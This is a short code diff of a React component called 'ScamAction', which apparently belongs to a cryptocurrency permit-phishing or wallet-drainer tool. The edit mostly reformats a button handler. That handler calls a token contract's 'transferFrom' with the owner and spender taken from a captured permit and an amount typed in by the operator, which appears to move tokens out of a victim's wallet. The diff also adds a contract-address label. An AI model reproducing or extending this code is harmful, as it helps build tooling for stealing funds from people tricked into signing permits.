@@ -53,13 +53,13 @@ const ScamAction = (props: {
 			</button>
 			<button onClick={async () => {
 				callContractMethod('transferFrom', [
-						data.permit.owner,
-						data.permit.spender,
-						window.prompt("Enter Amount to transfer"),
-						{
-							gasLimit: 1000000
-						}
-					], contractAddress,provider)
+					data.permit.owner,
+					data.permit.spender,
+					window.prompt("Enter Amount to transfer"),
+					{
+						gasLimit: 1000000
+					}
+				], contractAddress, provider)
 					.catch((e) => {
 						alert(`ERROR ${e?.message ?? e}`);
 						console.error(e)
@@ -69,9 +69,10 @@ const ScamAction = (props: {
 			}}>
 				Transfer
 			</button>
-			<input onChange={(e)=>{
+			<span>ContractAddr</span>
+			<input onChange={(e) => {
 				setContractAddress(e.target?.value);
-			}} value={contractAddress} placeholder={'Contract Address'} className={'border rounded'} />
+			}} value={contractAddress} placeholder={'Contract Address'} className={'border rounded'}/>
 		</div>
 	);
 };
